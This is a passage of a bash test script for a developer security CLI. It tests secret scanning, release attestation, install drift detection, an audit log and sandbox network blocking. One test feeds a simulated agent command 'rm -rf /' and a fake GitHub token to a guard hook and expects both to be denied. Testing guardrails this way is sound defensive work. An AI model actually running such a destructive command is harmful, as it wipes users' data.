  printf 'TOKEN = "%s"\n' "$ghp" > "$SG/s.py"; git -C "$SG" add -A >/dev/null 2>&1
  if ( cd "$SG" && "$COMPASS" scan --staged >/dev/null 2>&1 ); then no "scan --staged should catch a staged secret"; else ok "scan --staged catches a staged secret"; fi
  rm -rf "$SG"
fi
rm -rf "$SC"

echo "compass verify — release provenance (graceful + wired):"
GHSTUB="$(mktemp -d)"   # a gh too old for the `attestation` command → graceful skip
printf '#!/usr/bin/env bash\n[ "$1" = attestation ] && exit 1\nexit 0\n' > "$GHSTUB/gh"
chmod +x "$GHSTUB/gh"
PATH="$GHSTUB:$PATH" bash "$ROOT/scripts/verify-release.sh" v0.1.0 >/dev/null 2>&1; VRC=$?
eq  "verify skips (77) when gh lacks attestation support" "$VRC" 77
rm -rf "$GHSTUB"
RSW="$(cat "$ROOT/.github/workflows/release-sign.yml")"
has "release-sign attests provenance"          "$RSW" "attest-build-provenance"
has "release-sign has id-token + attestations" "$RSW" "attestations: write"
if grep -q 'verify) *exec' "$ROOT/bin/compass"; then ok "compass verify wired into the CLI"; else no "compass verify not wired"; fi

echo "compass drift — install fidelity (clean / hand-edited / non-+x hook):"
DD="$(mktemp -d)"
for n in settings.json CLAUDE.md statusline.sh agents commands skills workflows hooks output-styles; do
  [ -e "$ROOT/claude/$n" ] && ln -s "$ROOT/claude/$n" "$DD/$n"
done
if COMPASS_CLAUDE_DIR="$DD" COMPASS_CODEX_DIR="$DD/_nocodex" "$COMPASS" drift >/dev/null 2>&1; then ok "clean symlinked install → no drift"; else no "clean install should report no drift"; fi
rm "$DD/settings.json"; printf '{"hand":"edited"}\n' > "$DD/settings.json"
if COMPASS_CLAUDE_DIR="$DD" COMPASS_CODEX_DIR="$DD/_nocodex" "$COMPASS" drift >/dev/null 2>&1; then no "hand-edited settings should drift"; else ok "hand-edited copy detected as drift"; fi
rm -rf "$DD"
DH="$(mktemp -d)"
for n in settings.json CLAUDE.md statusline.sh agents commands skills workflows output-styles; do
  [ -e "$ROOT/claude/$n" ] && ln -s "$ROOT/claude/$n" "$DH/$n"
done
cp -R "$ROOT/claude/hooks" "$DH/hooks"; chmod -x "$DH/hooks/protect-paths.sh"
DOUT="$(COMPASS_CLAUDE_DIR="$DH" COMPASS_CODEX_DIR="$DH/_nocodex" "$COMPASS" drift 2>&1 || true)"
has "non-executable guardrail hook flagged" "$DOUT" "not executable"
rm -rf "$DH"

echo "compass audit-log — structured security trail:"
AL="$(mktemp -d)"
printf '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | COMPASS_HOME="$AL" bash "$ROOT/claude/hooks/protect-paths.sh" >/dev/null 2>&1 || true
gtok="ghp_""0123456789abcdef0123456789abcdef0123"   # split so THIS file stays scan-clean
printf '{"tool_name":"Write","tool_input":{"file_path":"/r/c.py","content":"K=%s"}}' "$gtok" | COMPASS_HOME="$AL" bash "$ROOT/claude/hooks/protect-paths.sh" >/dev/null 2>&1 || true
AJ="$(cat "$AL/audit.jsonl" 2>/dev/null || true)"
has "audit records the dangerous command" "$AJ" '"rule":"dangerous-command"'
has "audit records the secret-in-content" "$AJ" '"rule":"secret-in-content"'
has "audit decision is deny"              "$AJ" '"decision":"deny"'
has "audit-log table shows a row"         "$(COMPASS_HOME="$AL" "$COMPASS" audit-log 2>&1)" "dangerous-command"
if COMPASS_HOME="$AL" "$COMPASS" audit-log --json | jq -e . >/dev/null 2>&1; then ok "audit-log --json is valid JSON"; else no "audit-log --json should be valid"; fi
eq "audit-log --since future = 0 rows" "$(COMPASS_HOME="$AL" "$COMPASS" audit-log --json --since 2999-01-01 | grep -c . )" 0
rm -rf "$AL"

echo "compass sandbox — real containment (backend-aware):"
if "$COMPASS" sandbox -- >/dev/null 2>&1; then no "empty command should be a usage error"; else ok "empty command → usage error (exit 2)"; fi
if "$COMPASS" sandbox --bogus -- true >/dev/null 2>&1; then no "unknown flag should error"; else ok "unknown flag → usage error"; fi
if "$COMPASS" sandbox -- true >/dev/null 2>&1; then
  eq "sandbox runs a command"            "$("$COMPASS" sandbox -- bash -c 'echo ok42' 2>/dev/null)" ok42
  NETOUT="$("$COMPASS" sandbox -- bash -c 'curl -s --max-time 4 https://example.com >/dev/null 2>&1 && echo NET || echo blocked' 2>/dev/null || echo blocked)"
  eq "sandbox denies network by default" "$NETOUT" blocked
else
  ok "no usable sandbox backend here — refuses rather than run unconfined"
fi

echo
printf 'cli tests: %d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
